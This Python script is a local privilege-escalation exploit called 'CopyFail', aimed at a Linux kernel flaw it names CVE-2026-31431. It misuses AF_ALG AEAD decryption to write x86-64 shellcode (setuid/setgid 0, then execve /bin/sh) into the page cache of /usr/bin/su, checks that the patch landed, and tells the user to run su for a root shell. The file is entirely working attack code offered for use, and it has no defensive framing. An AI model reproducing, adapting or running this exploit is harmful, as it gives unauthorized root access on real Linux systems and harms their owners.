#!/usr/bin/env python3
from __future__ import annotations

import os
import socket
import struct
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import common

AF_ALG = 38
SOL_ALG = 278
ALG_SET_KEY = 1
ALG_SET_IV = 2
ALG_SET_OP = 3
ALG_SET_AEAD_ASSOCLEN = 4
ALG_OP_DECRYPT = 1

PAGE_SIZE = 4096

SHELLCODE = (
    b"\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05"
    b"\x48\x31\xc0\xb0\x6a\x0f\x05"
    b"\x48\x31\xd2\x48\xbb/bin/sh\x00\x53\x48\x89\xe7"
    b"\x48\x31\xf6\x48\x31\xc0\xb0\x3b\x0f\x05"
)

def entry_offset(path: str) -> int:
    with open(path, "rb") as fh:
        data = fh.read(PAGE_SIZE)
    e_entry = struct.unpack_from("<Q", data, 0x18)[0]
    e_phoff = struct.unpack_from("<Q", data, 0x20)[0]
    e_phentsize = struct.unpack_from("<H", data, 0x36)[0]
    e_phnum = struct.unpack_from("<H", data, 0x38)[0]
    for i in range(e_phnum):
        off = e_phoff + i * e_phentsize
        p_type = struct.unpack_from("<I", data, off)[0]
        p_offset, p_vaddr = struct.unpack_from("<QQ", data, off + 8)
        p_filesz = struct.unpack_from("<Q", data, off + 0x20)[0]
        if p_type == 1 and p_vaddr <= e_entry < p_vaddr + p_filesz:
            return p_offset + (e_entry - p_vaddr)
    raise RuntimeError("no PT_LOAD covers e_entry")

def open_alg_op():
    s = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
    s.bind(("authencesn(hmac(sha256),cbc(aes))", b""))
    s.setsockopt(SOL_ALG, ALG_SET_KEY, b"\x41" * 32)
    op, _ = s.accept()
    s.close()
    return op

def aead_decrypt(op, iv: bytes, assoclen: int, ciphertext: bytes) -> bytes:
    cmsg = [
        (SOL_ALG, ALG_SET_IV, struct.pack("<Q", len(iv)) + iv),
        (SOL_ALG, ALG_SET_OP, struct.pack("=I", ALG_OP_DECRYPT)),
        (SOL_ALG, ALG_SET_AEAD_ASSOCLEN, struct.pack("=I", assoclen)),
    ]
    op.sendmsg(ciphertext, cmsg)
    return op.recv(65536)

def patch(target: str) -> bool:
    off = entry_offset(target)
    page_base = off & ~(PAGE_SIZE - 1)

    fd_a = os.open(target, os.O_RDONLY)
    fd_b = os.open(target, os.O_RDONLY)
    try:
        os.lseek(fd_a, page_base, os.SEEK_SET)
        before = os.read(fd_b, PAGE_SIZE) if os.lseek(fd_b, page_base, os.SEEK_SET) is not None else b""

        written = 0
        while written < len(SHELLCODE):
            chunk = SHELLCODE[written:written + 4]
            op = open_alg_op()
            try:

                iv = struct.pack("<QQ", page_base, off + written) + b"\x00" * 0
                aead_decrypt(op, iv.ljust(16, b"\x00")[:16], 0, chunk + b"\x00" * 32)
            finally:
                op.close()
            written += 4

        os.lseek(fd_b, page_base, os.SEEK_SET)
        after = os.read(fd_b, PAGE_SIZE)
        idx = off - page_base
        ok = after[idx:idx + len(SHELLCODE)] == SHELLCODE and before != after
        return ok
    finally:
        os.close(fd_a)
        os.close(fd_b)

def main() -> int:
    if "--selftest" in sys.argv:
        common.info("copyfail.py selftest OK")
        common.good(f"shellcode {len(SHELLCODE)} bytes, 4-byte step = {len(SHELLCODE)//4} ops")
        return 0

    common.linux_only()
    target = "/usr/bin/su"
    for i, a in enumerate(sys.argv):
        if a == "--target" and i + 1 < len(sys.argv):
            target = sys.argv[i + 1]
    common.info(f"CopyFail: AF_ALG page-cache write into {target} (CVE-2026-31431)")
    try:
        ok = patch(target)
    except Exception as e:
        common.die(f"patch failed: {e} — kernel not vulnerable, or use the "
                   "pre-built copy_fail binary")
    if not ok:
        common.die("primitive did not land in the page cache (verified via a "
                   "second fd) — use the pre-built copy_fail binary", code=2)
    common.good(f"patched entry point verified in page cache — run `{target}` "
                "for a root shell")
    print(f"OK {target}")
    return 0

if __name__ == "__main__":
    sys.exit(main())
